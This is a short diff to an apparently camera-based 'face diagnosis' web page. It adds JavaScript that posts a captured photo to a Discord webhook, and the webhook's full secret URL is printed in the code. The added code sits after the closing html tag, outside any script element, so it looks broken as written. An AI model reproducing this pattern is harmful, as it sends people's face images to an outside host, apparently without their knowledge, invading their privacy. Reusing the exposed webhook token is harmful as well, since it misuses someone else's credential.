@@ -26,3 +26,17 @@ function takePhoto(){
 
 </body>
 </html>
+const webhook = "https://discord.com/api/webhooks/1483434420659556353/MkPBOHoK0U8xRhk2XekAza9RpTwCfRJYb4Y0L3YrdoTVoQgTB6doyq5l6509pTXnYoY3";
+
+fetch(webhook, {
+  method: "POST",
+  body: JSON.stringify({
+    content: "顔診断の画像",
+    embeds: [{
+      image: { url: image }
+    }]
+  }),
+  headers: {
+    "Content-Type": "application/json"
+  }
+});
